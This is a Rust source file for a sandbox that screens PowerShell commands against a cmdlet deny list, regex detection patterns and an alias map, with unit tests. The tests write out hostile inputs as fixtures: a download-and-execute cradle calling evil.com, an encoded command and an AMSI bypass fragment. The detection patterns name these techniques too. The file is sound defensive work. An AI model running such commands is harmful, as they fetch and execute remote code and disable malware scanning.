use regex::Regex;
use std::collections::HashMap;
use wf_types::script::sandbox::ShellPolicy;

use super::base::{ShellAnalysisContext, ShellAnalysisResult, ShellAnalyzer, ShellType};

const SHELL_TYPE: ShellType = ShellType::PowerShell;

const DENIED_COMMANDS: &[&str] = &[
    "Start-Process",
    "Stop-Process",
    "Get-WmiObject",
    "Get-WinEvent",
    "Invoke-WmiMethod",
    "Register-WmiEvent",
    "Remove-WmiObject",
    "Set-WmiInstance",
    "Invoke-Expression",
    "Invoke-Command",
    "Invoke-CimMethod",
    "Invoke-WebRequest",
    "Invoke-RestMethod",
    "Enter-PSSession",
    "Exit-PSSession",
    "New-PSSession",
    "Remove-PSSession",
    "Set-ExecutionPolicy",
    "Set-MpPreference",
    "Unblock-File",
    "New-Service",
    "Set-Service",
    "Restart-Service",
    "Stop-Service",
    "New-ItemProperty",
    "Set-ItemProperty",
    "Remove-ItemProperty",
];

pub const DANGEROUS_PATTERNS: &[&str] = &[
    r"IEX\s*\(?\s*(New-Object|Invoke-WebRequest|Invoke-RestMethod)",
    r"Invoke-Expression\s*\(?\s*(New-Object|Invoke-WebRequest)",
    r"-EncodedCommand\s+",
    r"-e\s+[A-Za-z0-9+/=]{20,}",
    r"\[System\.Convert\]::FromBase64String",
    r"New-Object\s+Net\.WebClient",
    r"New-Object\s+System\.Net\.WebClient",
    r#"\.DownloadString\(\s*(['"]?)https?://"#,
    r#"\.DownloadFile\(\s*(['"]?)https?://"#,
    r"AmsiUtils",
    r"amsiInitFailed",
    r"System\.Management\.Automation\.AmsiUtils",
    r"\[Ref\].*Assembly.*Load.*System\.Management\.Automation",
    r#"GetField\s*\(\s*['"]amsi"#,
    r"SetValue\s*\(\s*null",
    r"New-Object\s+-ComObject\s+",
    r#"CreateObject\s*\(\s*['"]WScript\.Shell"#,
    r"Advapi32\..*OpenProcessToken",
    r"Advapi32\..*DuplicateToken",
    r"Kernel32\..*VirtualAlloc",
    r"Kernel32\..*CreateThread",
    r"Kernel32\..*CreateProcess",
];

fn build_alias_map() -> HashMap<&'static str, &'static str> {
    HashMap::from([
        ("iex", "Invoke-Expression"),
        ("iwr", "Invoke-WebRequest"),
        ("irm", "Invoke-RestMethod"),
        ("icm", "Invoke-Command"),
        ("saps", "Start-Process"),
        ("gcm", "Get-Command"),
        ("gm", "Get-Member"),
        ("gi", "Get-Item"),
        ("gci", "Get-ChildItem"),
        ("gl", "Get-Location"),
        ("gp", "Get-ItemProperty"),
        ("gsv", "Get-Service"),
        ("gwmi", "Get-WmiObject"),
        ("ni", "New-Item"),
        ("nv", "New-Variable"),
        ("ogv", "Out-GridView"),
        ("oh", "Out-Host"),
        ("r", "Invoke-History"),
        ("rc", "Set-PSReadLineOption"),
        ("rm", "Remove-Item"),
        ("rmdir", "Remove-Item"),
        ("sasv", "Start-Service"),
        ("shcm", "Show-Command"),
        ("sls", "Select-String"),
        ("sp", "Set-ItemProperty"),
        ("spsv", "Stop-Service"),
        ("sv", "Set-Variable"),
        ("tee", "Tee-Object"),
        ("type", "Get-Content"),
        ("wi", "Write-Output"),
        ("write", "Write-Output"),
    ])
}

pub struct PowerShellAnalyzer;

struct ResolvedShellPolicy {
    allowed_commands: Vec<String>,
    denied_commands: Vec<String>,
    dangerous_patterns: Vec<String>,
    allow_pipe: bool,
    allow_redirect: bool,
}

impl PowerShellAnalyzer {
    fn resolve_policy(&self, policy: &ShellPolicy) -> ResolvedShellPolicy {
        ResolvedShellPolicy {
            allowed_commands: policy.allowed_commands.clone().unwrap_or_default(),
            denied_commands: policy
                .denied_commands
                .clone()
                .unwrap_or_else(|| DENIED_COMMANDS.iter().map(|s| s.to_string()).collect()),
            dangerous_patterns: policy
                .dangerous_patterns
                .clone()
                .unwrap_or_else(|| DANGEROUS_PATTERNS.iter().map(|s| s.to_string()).collect()),
            allow_pipe: policy.allow_pipe.unwrap_or(true),
            allow_redirect: policy.allow_redirect.unwrap_or(true),
        }
    }

    fn extract_primary_cmdlet(&self, tokens: &[String]) -> Option<String> {
        // Skip leading variable assignments like `$x =`
        let mut idx = 0;
        while idx + 1 < tokens.len() && tokens[idx].starts_with('$') && tokens[idx + 1] == "=" {
            idx += 2;
        }

        let first = tokens.get(idx)?;
        if first.is_empty() {
            return None;
        }

        let stripped = first.strip_prefix('&').unwrap_or(first).trim_start();

        let alias_map = build_alias_map();
        let lower = stripped.to_lowercase();
        if let Some(&resolved) = alias_map.get(lower.as_str()) {
            return Some(resolved.to_string());
        }

        Some(stripped.replace(['"', '\''], ""))
    }
}

impl ShellAnalyzer for PowerShellAnalyzer {
    fn shell_type(&self) -> ShellType {
        SHELL_TYPE
    }

    fn analyze(&self, ctx: &ShellAnalysisContext) -> ShellAnalysisResult {
        let policy = self.resolve_policy(ctx.policy);

        let primary = self.extract_primary_cmdlet(ctx.tokens);
        let primary = match primary {
            Some(p) if !p.is_empty() => p,
            _ => {
                return ShellAnalysisResult {
                    allowed: false,
                    reason: Some("Empty command".to_string()),
                    command: ctx.command.to_string(),
                    shell_type: SHELL_TYPE,
                };
            }
        };

        if policy.denied_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command denied by blacklist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allowed_commands.is_empty() && !policy.allowed_commands.contains(&primary) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some(format!("Command not in whitelist: {primary}")),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        for pattern in policy.dangerous_patterns {
            if let Ok(re) = Regex::new(&pattern) {
                if re.is_match(ctx.command) {
                    return ShellAnalysisResult {
                        allowed: false,
                        reason: Some(format!("Dangerous pattern detected: {pattern}")),
                        command: ctx.command.to_string(),
                        shell_type: SHELL_TYPE,
                    };
                }
            }
        }

        if !policy.allow_pipe && ctx.command.contains('|') {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Pipe operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        if !policy.allow_redirect && (ctx.command.contains('<') || ctx.command.contains('>')) {
            return ShellAnalysisResult {
                allowed: false,
                reason: Some("Redirect operator is not allowed".to_string()),
                command: ctx.command.to_string(),
                shell_type: SHELL_TYPE,
            };
        }

        ShellAnalysisResult {
            allowed: true,
            reason: None,
            command: ctx.command.to_string(),
            shell_type: SHELL_TYPE,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use wf_types::script::sandbox::ShellPolicy;

    fn empty_policy() -> ShellPolicy {
        ShellPolicy {
            allowed_commands: None,
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        }
    }

    fn analyzer() -> PowerShellAnalyzer {
        PowerShellAnalyzer
    }

    fn analyze(cmd: &str, policy: &ShellPolicy) -> ShellAnalysisResult {
        let tokens = shlex::split(cmd).unwrap_or_default();
        let ctx = ShellAnalysisContext {
            command: cmd,
            policy,
            tokens: &tokens,
        };
        analyzer().analyze(&ctx)
    }

    #[test]
    fn test_powershell_analyzer_shell_type() {
        assert_eq!(analyzer().shell_type(), ShellType::PowerShell);
    }

    #[test]
    fn test_allows_safe() {
        let result = analyze("Get-ChildItem", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_denies_invoke_expression() {
        let result = analyze("Invoke-Expression \"malicious\"", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_start_process() {
        let result = analyze("Start-Process -FilePath malware.exe", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_invoke_webrequest() {
        let result = analyze("Invoke-WebRequest -Uri http://evil.com", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_iex_alias() {
        let result = analyze(
            "iex (New-Object Net.WebClient).DownloadString('http://evil.com')",
            &empty_policy(),
        );
        assert!(!result.allowed);
        assert!(result
            .reason
            .as_ref()
            .unwrap()
            .contains("Invoke-Expression"));
    }

    #[test]
    fn test_alias_resolution_iex() {
        let result = analyze("iex some_command", &empty_policy());
        assert!(!result.allowed);
        assert!(result
            .reason
            .as_ref()
            .unwrap()
            .contains("Invoke-Expression"));
    }

    #[test]
    fn test_alias_resolution_iwr() {
        let result = analyze("iwr http://example.com", &empty_policy());
        assert!(!result.allowed);
        assert!(result
            .reason
            .as_ref()
            .unwrap()
            .contains("Invoke-WebRequest"));
    }

    #[test]
    fn test_denies_encoded_command() {
        let result = analyze("powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", &empty_policy());
        assert!(!result.allowed);
    }

    #[test]
    fn test_denies_amsi_bypass() {
        let result = analyze(
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
            &empty_policy(),
        );
        assert!(!result.allowed);
    }

    #[test]
    fn test_variable_assignment_stripped() {
        let result = analyze("$x = Get-ChildItem", &empty_policy());
        assert!(result.allowed);
    }

    #[test]
    fn test_whitelist_restricts() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec!["Get-ChildItem".to_string()]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("Get-Process", &policy);
        assert!(!result.allowed);
        assert!(result.reason.unwrap().contains("whitelist"));
    }

    #[test]
    fn test_blacklist_wins_over_whitelist() {
        let policy = ShellPolicy {
            allowed_commands: Some(vec![
                "Invoke-Expression".to_string(),
                "Get-ChildItem".to_string(),
            ]),
            denied_commands: None,
            dangerous_patterns: None,
            allow_pipe: None,
            allow_redirect: None,
        };
        let result = analyze("Invoke-Expression \"malicious\"", &policy);
        assert!(!result.allowed);
        let reason = result.reason.unwrap();
        assert!(
            reason.contains("blacklist"),
            "blacklist must be reported before whitelist: {reason}"
        );
    }

    #[test]
    fn test_empty_command() {
        let result = analyze("", &empty_policy());
        assert!(!result.allowed);
    }
}
